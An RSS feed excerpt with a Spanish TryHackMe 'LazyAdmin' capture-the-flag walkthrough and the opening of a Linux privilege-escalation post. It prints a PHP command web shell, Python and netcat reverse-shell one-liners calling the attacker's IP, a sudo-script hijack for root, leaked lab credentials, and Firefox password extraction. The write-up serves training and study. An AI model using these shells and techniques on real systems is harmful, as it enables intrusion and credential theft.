&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_22-53-22.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;http&#34;&gt;HTTP&lt;/h3&gt;
&lt;p&gt;Al visitar la pagina nos muestra el tipico index de apache.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_22-54-16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos esta herramienta para poder obtener los directorios y archivos ue puedan ser interesantes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/ -x php,txt,html -q -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -w /usr/share/wordlists/dirb/common.txt 
/content &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@aoiri:~/tryhackme/lazyadmin#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;sweet-rice-cms&#34;&gt;Sweet Rice CMS&lt;/h3&gt;
&lt;h4 id=&#34;content&#34;&gt;/content&lt;/h4&gt;
&lt;p&gt;Encontramos un CMS especificamente Sweet Rice, con un mensaje que indica que el sitio web esta en construccion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-01-41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Pasamos nuevamente gobuster sobre la direccion de SweetRice y econtramos distintos directorios relacionados con el gestor de contenidos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/content/ -x php,txt,html -q -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -w /usr/share/wordlists/dirb/common.txt 
/_themes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/as &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/attachment &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/changelog.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/inc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/license.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@aoiri:~/tryhackme/lazyadmin# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Una direccion interesante es &lt;code&gt;/as&lt;/code&gt;, contiene un panel de logeo, intentamos utilizar las credenciales por default pero no logramos acceder.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-09-51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Buscamos exploits que pudiesen afectar a este gestor de contenidos y encontramos distintas vulnerabilidades.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-12-50.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;sweetrice-151---backup-disclosure&#34;&gt;SweetRice 1.5.1 - Backup Disclosure&lt;/h4&gt;
&lt;p&gt;Una de ellas indica que existe un backup de mysql en el directorio &lt;code&gt;/inc/mysql&lt;/code&gt; directorio que existe en esta pagina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-14-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Descargamos el archivo y al analizarlo encontramos que se hizo una insersion en la tabla options donde encontramos un nombre y una contraseña, las cuales podemos utilizar en el panel de logeo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-21-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Buscamos el hash en crackstation y obtuvimos la contraseña en texto plano:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-22-21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credenciales:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;User: manager
Password: Password123
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;sweetrice-151---arbitrary-file-upload&#34;&gt;SweetRice 1.5.1 - Arbitrary File Upload&lt;/h4&gt;
&lt;p&gt;Utilizamos un exploit que afecta a este gestor de contenidos para subir una shell, antes de ejecutarlo agregamos la ip y un dominio a nuestro archivo hosts (&lt;code&gt;lazyadmin.thm&lt;/code&gt; en mi caso) ya que nos pedira un dominio y no una IP. Tambien agregamos &lt;code&gt;/content/&lt;/code&gt; a los valores que contienen &lt;code&gt;/as/&lt;/code&gt; y &lt;code&gt;/attachment/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Creamos un archivo en php de prueba:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;echo &amp;#34;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;:D&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&amp;#34; &amp;gt; shellfoo.php5
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos y vemos que se subio nuestro archivo:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-51-57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuestro archivo de prueba:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-52-21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Subimos una webshell:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$cmd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-55-24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos un comando para obtener una shell inversa:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.8.1.72&amp;#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-12_00-02-45.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---flag&#34;&gt;USER - Flag&lt;/h2&gt;
&lt;p&gt;Nos movemos a la carpeta principal del usuario itguy y obtenemos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-12_00-08-06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una enumeracion rapida con el comando &lt;code&gt;sudo -l -l&lt;/code&gt;, y vemos que hay un archivo que podemos ejecutar con perl con el comando sudo, a su vez este archivo ejecuta otro (&lt;code&gt;/etc/copy.sh&lt;/code&gt;), este ultimo ejecuta un comando para obtener una shell inversa hacia una IP.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;/home/itguy/backup.pl&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span class=&#34;nb&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/etc/copy.sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;copy.sh&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rm /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;mkfifo /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;cat /tmp/f&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;/bin/sh -i 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;nc 192.168.0.190 &lt;span class=&#34;m&#34;&gt;5554&lt;/span&gt; &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El archivo &lt;code&gt;backup.pl&lt;/code&gt; no puede ser modificado, pero el archivo &lt;code&gt;copy.sh&lt;/code&gt; si, hicimos una pequeña prueba con un comentario en bash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;#foo&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/copy.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-12_00-14-17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Permisos &lt;strong&gt;copy.sh&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-12_00-16-05.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos una shell inversa al archivo &lt;strong&gt;copy.sh&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.8.1.72 1337 &amp;gt;/tmp/f&amp;#34;&lt;/span&gt; &amp;gt; /etc/copy.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-12_00-20-21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos y obtenemos una shell inversa con el usuario root, junto con nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-12_00-21-27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;firefox-decrypt&#34;&gt;Firefox Decrypt&lt;/h4&gt;
&lt;p&gt;Dentro de la carpeta principal del usuario itguy encontramos la carpeta &lt;code&gt;.mozilla/firefox/&lt;/code&gt;, utilizamos &lt;a href=&#34;https://github.com/unode/firefox_decrypt&#34;&gt;&lt;strong&gt;firefox_decrypt&lt;/strong&gt;&lt;/a&gt; para obtener las contraseñas y usuarios guardados.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/Screenshot_2019-12-12_00-28-07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/LazyAdmin/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/LazyAdmin/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
            
              <category>firefox decrypt</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Linux Privesc Playground</title>
        <link>https://sckull.github.io/posts/linuxprivescplayground/</link>
        <pubDate>Tue, 10 Dec 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 10 Dec 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/linuxprivescplayground/</guid>
        <description>Linux Privesc Playground es una maquina de TryHackMe aqui encontrarás la solucion para escalar privilegios de distintas formas.</description>
        <content:encoded>&lt;p&gt;Linux Privesc Playground es una maquina de TryHackMe aqui encontrarás la solucion para escalar privilegios de distintas formas.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Linux Privesc Playground&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;A linux privilege escalation playground, filled with badly configured superuser permissions, incorrectly set SUID bits, and more!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;358&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Relativamente Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/SherlockSec&#34;&gt;SherlockSec&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;p&gt;Linux Privesc Playground, contiene ficheros del tipo SUID los cuales al ejecutarlos, se obtiene permisos del usuario quien creo este fichero unicamente durante la ejecucion.&lt;/p&gt;
&lt;p&gt;Las credenciales de la maquina:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;SSH Credentials - user:password
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/LPP/cScreenshot_2019-12-09_22-34-42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para poder enumerar los ficheros del tipo SUID podemos utilizar los siguientes comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;find / -perm -4000 2&amp;gt; /dev/null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; xargs ls -lah

find / -perm -u&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;s -type f 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;De igual forma podemos utilizar sudo para poder ver que ficheros pueden ser ejecutados bajo el comando sudo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo -l -l
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Podemos ver que nos devuelve una lista de ficheros los cuales pueden ser utilizados para obtener privilegios de root.&lt;/p&gt;
&lt;p&gt;A continuacion se listan la solucion para alguno de ellos, se puede encontrar los comandos en la pagina &lt;a href=&#34;https://gtfobins.github.io/&#34;&gt;&lt;strong&gt;GTFOBINS&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;binapt-get&#34;&gt;/bin/apt-get*&lt;/h3&gt;
